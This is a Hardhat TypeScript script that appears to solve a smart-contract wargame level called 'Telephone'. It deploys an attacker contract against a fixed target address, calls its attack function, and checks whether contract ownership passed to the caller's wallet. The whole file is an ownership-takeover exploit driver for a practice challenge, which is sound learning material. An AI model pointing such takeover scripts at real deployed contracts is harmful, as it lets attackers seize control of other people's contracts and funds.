import { ethers } from "hardhat";
import hre from "hardhat";

const CONTRACT_ADDRESSES = "0x4e8B9e48d52cf7c67656437E9453873E68A3E502";
const CONTRACT_NAME = "Telephone";
const ATTACKER_NAME = "TelephoneAttack";

async function hack() {
  // real contract
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESSES);

  // attacker contract
  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);

  //get owner from private key
  const privateKey = hre.network.config.accounts as string[];
  const wallet = new ethers.Wallet(privateKey[0]).address;
  console.log("OWNER: ", wallet);

  // check owner address before hack
  let owner = await contract.owner();
  console.log("Contract OWNER: ", owner);

  const tx = await attackerContract.attack();
  tx.wait(1);

  // check if owner is changed
  const ownerAfterHack = await contract.owner();
  console.log("Contract OWNER After Hack: ", ownerAfterHack);
  if (ownerAfterHack === wallet) {
    console.log("HACK");
  }
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
